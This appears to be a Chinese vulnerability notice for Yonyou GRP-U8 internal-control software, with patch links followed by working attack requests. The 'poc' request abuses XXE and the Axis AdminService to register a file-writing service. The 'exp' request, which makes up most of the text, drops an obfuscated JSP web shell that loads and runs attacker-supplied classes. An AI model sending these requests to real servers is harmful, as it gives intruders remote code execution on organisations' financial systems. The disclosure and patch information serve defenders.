# 用友GRP-U8内控管理软件ReturnForWcp存在命令执行漏洞

## **0X01: 漏洞描述**

用友政务公司获知用友GRP-U8内控管理软件存在命令执行漏洞后，第一时间组织团队进行应急响应，分析处理漏洞问题并发布相关解决补丁，并对相关支持人员进行培训。本次漏洞主要是利用/servlet/PayReturnForWcp接口，通过axis组件利用xxe，使用外部实体%name来加载"http://xxxx/services/AdminService?method=xx" 远程URL，调用javax.elELProcessor，执行成功，存在一定的安全隐患。

## **0X02:影响版本**

app="用友-GRP-U8"

用友GRP-U8R10产品官方在售及提供服务的版本为U8Manager，产品分B、C、G三个产品系列，以上受到本次通报漏洞的影响。

## **0X03:修复方案**

本次漏洞加固方式为使用JDOM解析器禁止xml中某些实体的使用。已发布相关补丁，请及时更新修复补丁。

请所有渠道总经理、技术支持部，联动向下传达到客户和沟通群。

**获取补丁方式如下：**

1. 百度云盘：https://pan.baidu.com/s/1cQIxlUkpYAxE508EXjgQxA

提取码：n1xy

2. 用友云盘：https://pan.yonyou.com/s/gUWlv8QkSsY密码：a61h

补丁名称：20231031-关于用友GRP-U8内控管理软件ReturnForWcp存在命令执行漏洞的解决方案.zip



## 0X04:poc

```
POST /servlet/PayReturnForWcp  HTTP/1.1
Host: host
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 829


<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://127.0.0.1:9393/services/AdminService?method=!--%3E%3Cdeployment%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%3E%3Cservice%20name%3D%22ttt3%22%20provider%3D%22java%3ARPC%22%3E%3CrequestFlow%3E%3Chandler%20type%3D%22java%3Aorg.apache.axis.handlers.LogHandler%22%20%3E%3Cparameter%20name%3D%22LogHandler.fileName%22%20value%3D%22E:UFGOV-ZX10.5.2U8webappsu8qxttt2.jsp%22%20%2F%3E%3Cparameter%20name%3D%22LogHandler.writeToConsole%22%20value%3D%22false%22%20%2F%3E%3C%2Fhandler%3E%3C%2FrequestFlow%3E%3Cparameter%20name%3D%22className%22%20value%3D%22java.util.Random%22%20%2F%3E%3Cparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%20%2F%3E%3C%2Fservice%3E%3C%2Fdeployment">
```

exp
```
POST /services/ttt3 HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: text/xml; charset=utf-8SOAP
Action: ""
Content-Length: 11968
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://util.java">   <soapenv:Header/>   <soapenv:Body>      <util:ints soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">         <in0 xsi:type="xsd:long" xs:type="type:long" xmlns:xs="http://www.w3.org/2000/XMLSchema-instance"><![CDATA[<% //uuu000auuuu0020uuuu0053uuuu0074uuuu0072uuuu0069uuuu006euuuu0067uuuu0020uuuu0048uuuu0062uuuu0038uuuu0033uuuu0034uuuu0020uuuu003duuuu0020uuuu0072uuuu0065uuuu0071uuuu0075uuuu0065uuuu0073uuuu0074uuuu002euuuu0067uuuu0065uuuu0074uuuu0050uuuu0061uuuu0072uuuu0061uuuu006duuuu0065uuuu0074uuuu0065uuuu0072uuuu0028uuuu0022uuuu0070uuuu0061uuuu0073uuuu0073uuuu0022uuuu0029uuuu003buuuu0069uuuu0066uuuu0020uuuu0028uuuu0048uuuu0062uuuu0038uuuu0033uuuu0034uuuu0020uuuu0021uuuu003duuuu0020uuuu006euuuu0075uuuu006cuuuu006cuuuu0029uuuu0020uuuu007buuuu0020uuuu0063uuuu006cuuuu0061uuuu0073uuuu0073uuuu0020uuuu0045uuuu0070uuuu006cuuuu0078uuuu0038uuuu0034uuuu0061uuuu0033uuuu0020uuuu0065uuuu0078uuuu0074uuuu0065uuuu006euuuu0064uuuu0073uuuu002fuuuu002auuuu005auuuu0038uuuu0031uuuu0038uuuu0065uuuu0035uuuu0039uuuu0030uuuu0065uuuu0075uuuu002auuuu002fuuuu0043uuuu006cuuuu0061uuuu0073uuuu0073uuuu004cuuuu006fuuuu0061uuuu0064uuuu0065uuuu0072uuuu0020uuuu007buuuu0020uuuu0045uuuu0070uuuu006cuuuu0078uuuu0038uuuu0034uuuu0061uuuu0033uuuu0028uuuu0043uuuu006cuuuu0061uuuu0073uuuu0073uuuu004cuuuu006fuuuu0061uuuu0064uuuu0065uuuu0072uuuu0020uuuu004cuuuu0074uuuu0038uuuu0056uuuu004auuuu0034uuuu0029uuuu0020uuuu007buuuu0020uuuu0073uuuu0075uuuu0070uuuu0065uuuu0072uuuu0028uuuu004cuuuu0074uuuu0038uuuu0056uuuu004auuuu0034uuuu0029uuuu003buuuu0020uuuu007duuuu0020uuuu0070uuuu0075uuuu0062uuuu006cuuuu0069uuuu0063uuuu0020uuuu0043uuuu006cuuuu0061uuuu0073uuuu0073uuuu0020uuuu0048uuuu0062uuuu0038uuuu0033uuuu0034uuuu0028uuuu0062uuuu0079uuuu0074uuuu0065uuuu005buuuu005duuuu0020uuuu0062uuuu0029uuuu0020uuuu007buuuu0020uuuu0072uuuu0065uuuu0074uuuu0075uuuu0072uuuu006euuuu0020uuuu0073uuuu0075uuuu0070uuuu0065uuuu0072uuuu002euuuu0064uuuu0065uuuu0066uuuu0069uuuu006euuuu0065uuuu0043uuuu006cuuuu0061uuuu0073uuuu0073uuuu0028uuuu0062uuuu002cuuuu0020uuuu0030uuuu002cuuuu0020uuuu0062uuuu002euuuu006cuuuu0065uuuu006euuuu0067uuuu0074uuuu0068uuuu0029uuuu003buuuu007duuuu007duuuu0062uuuu0079uuuu0074uuuu0065uuuu005buuuu005duuuu0020uuuu0062uuuu0079uuuu0074uuuu0065uuuu0073uuuu0020uuuu003duuuu0020uuuu006euuuu0075uuuu006cuuuu006cuuuu003buuuu0074uuuu0072uuuu0079uuuu0020uuuu007buuuu0069uuuu006euuuu0074uuuu005buuuu005duuuu0020uuuu0061uuuu0061uuuu0020uuuu003duuuu0020uuuu006euuuu0065uuuu0077uuuu0020uuuu0069uuuu006euuuu0074uuuu005buuuu005duuuu007buuuu0039uuuu0039uuuu002cuuuu0020uuuu0031uuuu0030uuuu0031uuuu002cuuuu0020uuuu0031uuuu0032uuuu0036uuuu002cuuuu0020uuuu0036uuuu0032uuuu002cuuuu0020uuuu0031uuuu0032uuuu0035uuuu002cuuuu0020uuuu0031uuuu0032uuuu0031uuuu002cuuuu0020uuuu0039uuuu0039uuuu002cuuuu0020uuuu0031uuuu0031uuuu0035uuuu002cuuuu0020uuuu0036uuuu0032uuuu002cuuuu0020uuuu0038uuuu0032uuuu002cuuuu0020uuuu0038uuuu0031uuuu002cuuuu0020uuuu0036uuuu0037uuuu002cuuuu0020uuuu0038uuuu0035uuuu002cuuuu0020uuuu0033uuuu0038uuuu002cuuuu0020uuuu0033uuuu0036uuuu002cuuuu0020uuuu0038uuuu0034uuuu002cuuuu0020uuuu0031uuuu0031uuuu0037uuuu002cuuuu0020uuuu0031uuuu0031uuuu0035uuuu002cuuuu0020uuuu0031uuuu0032uuuu0037uuuu002cuuuu0020uuuu0031uuuu0031uuuu0036uuuu002cuuuu0020uuuu0031uuuu0031uuuu0037uuuu002cuuuu0020uuuu0039uuuu0038uuuu007duuuu003buuuu0020uuuu0053uuuu0074uuuu0072uuuu0069uuuu006euuuu0067uuuu0020uuuu0063uuuu0063uuuu0073uuuu0074uuuu0072uuuu0020uuuu003duuuu0020uuuu0022uuuu0022uuuu003buuuu0066uuuu006fuuuu0072uuuu0020uuuu0028uuuu0069uuuu006euuuu0074uuuu0020uuuu0069uuuu0020uuuu003duuuu0020uuuu0030uuuu003buuuu0020uuuu0069uuuu0020uuuu003cuuuu0020uuuu0061uuuu0061uuuu002euuuu006cuuuu0065uuuu006euuuu0067uuuu0074uuuu0068uuuu003buuuu0020uuuu0069uuuu002buuuu002buuuu0029uuuu0020uuuu007buuuu0061uuuu0061uuuu005buuuu0069uuuu005duuuu0020uuuu003duuuu0020uuuu0061uuuu0061uuuu005buuuu0069uuuu005duuuu0020uuuu005euuuu0020uuuu0030uuuu0078uuuu0030uuuu0031uuuu0030uuuu003buuuu0020uuuu0063uuuu0063uuuu0073uuuu0074uuuu0072uuuu0020uuuu003duuuu0020uuuu0063uuuu0063uuuu0073uuuu0074uuuu0072uuuu0020uuuu002buuuu0020uuuu0028uuuu0063uuuu0068uuuu0061uuuu0072uuuu0029uuuu0020uuuu0061uuuu0061uuuu005buuuu0069uuuu005duuuu003buuuu007duuuu0043uuuu006cuuuu0061uuuu0073uuuu0073uuuu0020uuuu0041uuuu0034uuuu0063uuuu0030uuuu0069uuuu0020uuuu003duuuu0020uuuu0043uuuu006cuuuu0061uuuu0073uuuu0073uuuu002euuuu0066uuuu006fuuuu0072uuuu004euuuu0061uuuu006duuuu0065uuuu0028uuuu0063uuuu0063uuuu0073uuuu0074uuuu0072uuuu0029uuuu003buuuu0053uuuu0074uuuu0072uuuu0069uuuu006euuuu0067uuuu0020uuuu006buuuu0020uuuu003duuuu0020uuuu006euuuu0065uuuu0077uuuu0020uuuu0053uuuu0074uuuu0072uuuu0069uuuu006euuuu0067uuuu0028uuuu006euuuu0065uuuu0077uuuu0020uuuu0062uuuu0079uuuu0074uuuu0065uuuu005buuuu005duuuu007buuuu0031uuuu0030uuuu0030uuuu002cuuuu0031uuuu0030uuuu0031uuuu002cuuuu0039uuuu0039uuuu002cuuuu0031uuuu0031uuuu0031uuuu002cuuuu0031uuuu0030uuuu0030uuuu002cuuuu0031uuuu0030uuuu0031uuuu002cuuuu0036uuuu0036uuuu002cuuuu0031uuuu0031uuuu0037uuuu002cuuuu0031uuuu0030uuuu0032uuuu002cuuuu0031uuuu0030uuuu0032uuuu002cuuuu0031uuuu0030uuuu0031uuuu002cuuuu0031uuuu0031uuuu0034uuuu007duuuu0029uuuu003buuuu0062uuuu0079uuuu0074uuuu0065uuuu0073uuuu0020uuuu003duuuu0020uuuu0028uuuu0062uuuu0079uuuu0074uuuu0065uuuu005buuuu005duuuu0029uuuu0020uuuu0041uuuu0034uuuu0063uuuu0030uuuu0069uuuu002euuuu0067uuuu0065uuuu0074uuuu004duuuu0065uuuu0074uuuu0068uuuu006fuuuu0064uuuu0028uuuu006buuuu002cuuuu0020uuuu0053uuuu0074uuuu0072uuuu0069uuuu006euuuu0067uuuu002euuuu0063uuuu006cuuuu0061uuuu0073uuuu0073uuuu0029uuuu002euuuu0069uuuu006euuuu0076uuuu006fuuuu006buuuu0065uuuu0028uuuu0041uuuu0034uuuu0063uuuu0030uuuu0069uuuu002euuuu006euuuu0065uuuu0077uuuu0049uuuu006euuuu0073uuuu0074uuuu0061uuuu006euuuu0063uuuu0065uuuu0028uuuu0029uuuu002cuuuu0020uuuu0048uuuu0062uuuu0038uuuu0033uuuu0034uuuu0029uuuu003buuuu007duuuu0063uuuu0061uuuu0074uuuu0063uuuu0068uuuu0020uuuu0028uuuu0045uuuu0078uuuu0063uuuu0065uuuu0070uuuu0074uuuu0069uuuu006fuuuu006euuuu0020uuuu0065uuuu0029uuuu0020uuuu007buuuu0069uuuu006euuuu0074uuuu005buuuu005duuuu0020uuuu0061uuuu0061uuuu0020uuuu003duuuu0020uuuu006euuuu0065uuuu0077uuuu0020uuuu0069uuuu006euuuu0074uuuu005buuuu005duuuu007buuuu0031uuuu0032uuuu0032uuuu002cuuuu0020uuuu0031uuuu0031uuuu0033uuuu002cuuuu0020uuuu0031uuuu0030uuuu0032uuuu002cuuuu0020uuuu0031uuuu0031uuuu0033uuuu002cuuuu0020uuuu0036uuuu0032uuuu002cuuuu0020uuuu0031uuuu0030uuuu0031uuuu002cuuuu0020uuuu0031uuuu0030uuuu0030uuuu002cuuuu0020uuuu0031uuuu0032uuuu0031uuuu002cuuuu0020uuuu0031uuuu0032uuuu0034uuuu002cuuuu0020uuuu0036uuuu0032uuuu002cuuuu0020uuuu0038uuuu0032uuuu002cuuuu0020uuuu0031uuuu0031uuuu0033uuuu002cuuuu0020uuuu0039uuuu0039uuuu002cuuuu0020uuuu0031uuuu0031uuuu0037uuuu002cuuuu0020uuuu0033uuuu0038uuuu002cuuuu0020uuuu0033uuuu0036uuuu007duuuu003buuuu0053uuuu0074uuuu0072uuuu0069uuuu006euuuu0067uuuu0020uuuu0063uuuu0063uuuu0073uuuu0074uuuu0072uuuu0020uuuu003duuuu0020uuuu0022uuuu0022uuuu003buuuu0066uuuu006fuuuu0072uuuu0020uuuu0028uuuu0069uuuu006euuuu0074uuuu0020uuuu0069uuuu0020uuuu003duuuu0020uuuu0030uuuu003buuuu0020uuuu0069uuuu0020uuuu003cuuuu0020uuuu0061uuuu0061uuuu002euuuu006cuuuu0065uuuu006euuuu0067uuuu0074uuuu0068uuuu003buuuu0020uuuu0069uuuu002buuuu002buuuu0029uuuu0020uuuu007buuuu0061uuuu0061uuuu005buuuu0069uuuu005duuuu0020uuuu003duuuu0020uuuu0061uuuu0061uuuu005buuuu0069uuuu005duuuu0020uuuu005euuuu0020uuuu0030uuuu0078uuuu0030uuuu0031uuuu0030uuuu003buuuu0063uuuu0063uuuu0073uuuu0074uuuu0072uuuu0020uuuu003duuuu0020uuuu0063uuuu0063uuuu0073uuuu0074uuuu0072uuuu0020uuuu002buuuu0020uuuu0028uuuu0063uuuu0068uuuu0061uuuu0072uuuu0029uuuu0020uuuu0061uuuu0061uuuu005buuuu0069uuuu005duuuu003buuuu007duuuu0043uuuu006cuuuu0061uuuu0073uuuu0073uuuu0020uuuu0063uuuu006cuuuu0061uuuu007auuuu007auuuu0020uuuu003duuuu0020uuuu0043uuuu006cuuuu0061uuuu0073uuuu0073uuuu002euuuu0066uuuu006fuuuu0072uuuu004euuuu0061uuuu006duuuu0065uuuu0028uuuu0063uuuu0063uuuu0073uuuu0074uuuu0072uuuu0029uuuu003buuuu004fuuuu0062uuuu006auuuu0065uuuu0063uuuu0074uuuu0020uuuu0064uuuu0065uuuu0063uuuu006fuuuu0064uuuu0065uuuu0072uuuu0020uuuu003duuuu0020uuuu0063uuuu006cuuuu0061uuuu007auuuu007auuuu002euuuu0067uuuu0065uuuu0074uuuu004duuuu0065uuuu0074uuuu0068uuuu006fuuuu0064uuuu0028uuuu0022uuuu0067uuuu0065uuuu0074uuuu0044uuuu0065uuuu0063uuuu006fuuuu0064uuuu0065uuuu0072uuuu0022uuuu0029uuuu002euuuu0069uuuu006euuuu0076uuuu006fuuuu006buuuu0065uuuu0028uuuu006euuuu0075uuuu006cuuuu006cuuuu0029uuuu003buuuu0062uuuu0079uuuu0074uuuu0065uuuu0073uuuu0020uuuu003duuuu0020uuuu0028uuuu0062uuuu0079uuuu0074uuuu0065uuuu005buuuu005duuuu0029uuuu0020uuuu0064uuuu0065uuuu0063uuuu006fuuuu0064uuuu0065uuuu0072uuuu002euuuu0067uuuu0065uuuu0074uuuu0043uuuu006cuuuu0061uuuu0073uuuu0073uuuu0028uuuu0029uuuu002euuuu0067uuuu0065uuuu0074uuuu004duuuu0065uuuu0074uuuu0068uuuu006fuuuu0064uuuu0028uuuu0022uuuu0064uuuu0065uuuu0063uuuu006fuuuu0064uuuu0065uuuu0022uuuu002cuuuu0020uuuu0053uuuu0074uuuu0072uuuu0069uuuu006euuuu0067uuuu002euuuu0063uuuu006cuuuu0061uuuu0073uuuu0073uuuu0029uuuu002euuuu0069uuuu006euuuu0076uuuu006fuuuu006buuuu0065uuuu0028uuuu0064uuuu0065uuuu0063uuuu006fuuuu0064uuuu0065uuuu0072uuuu002cuuuu0020uuuu0048uuuu0062uuuu0038uuuu0033uuuu0034uuuu0029uuuu003buuuu007duuuu0043uuuu006cuuuu0061uuuu0073uuuu0073uuuu0020uuuu0061uuuu0043uuuu006cuuuu0061uuuu0073uuuu0073uuuu0020uuuu003duuuu0020uuuu006euuuu0065uuuu0077uuuu0020uuuu0045uuuu0070uuuu006cuuuu0078uuuu0038uuuu0034uuuu0061uuuu0033uuuu0028uuuu0054uuuu0068uuuu0072uuuu0065uuuu0061uuuu0064uuuu002euuuu0063uuuu0075uuuu0072uuuu0072uuuu0065uuuu006euuuu0074uuuu0054uuuu0068uuuu0072uuuu0065uuuu0061uuuu0064uuuu0028uuuu0029uuuu002euuuu0067uuuu0065uuuu0074uuuu0043uuuu006fuuuu006euuuu0074uuuu0065uuuu0078uuuu0074uuuu0043uuuu006cuuuu0061uuuu0073uuuu0073uuuu004cuuuu006fuuuu0061uuuu0064uuuu0065uuuu0072uuuu0028uuuu0029uuuu0029uuuu002euuuu0048uuuu0062uuuu0038uuuu0033uuuu0034uuuu0028uuuu0062uuuu0079uuuu0074uuuu0065uuuu0073uuuu0029uuuu003buuuu004fuuuu0062uuuu006auuuu0065uuuu0063uuuu0074uuuu0020uuuu006fuuuu0020uuuu003duuuu0020uuuu0061uuuu0043uuuu006cuuuu0061uuuu0073uuuu0073uuuu002euuuu006euuuu0065uuuu0077uuuu0049uuuu006euuuu0073uuuu0074uuuu0061uuuu006euuuu0063uuuu0065uuuu0028uuuu0029uuuu003buuuu006fuuuu002euuuu0065uuuu0071uuuu0075uuuu0061uuuu006cuuuu0073uuuu0028uuuu0070uuuu0061uuuu0067uuuu0065uuuu0043uuuu006fuuuu006euuuu0074uuuu0065uuuu0078uuuu0074uuuu0029uuuu003buuuu007duuuu0020uuuu0065uuuu006cuuuu0073uuuu0065uuuu0020uuuu007buuuu007d %>]]></in0>         <in1 xsi:type="xsd:long" xs:type="type:long" xmlns:xs="http://www.w3.org/2000/XMLSchema-instance">?</in1>      </util:ints>   </soapenv:Body></soapenv:Envelope>
```
链接：
https://security.yonyou.com/#/noticeInfo?id=418

https://cn-sec.com/archives/2218779.html
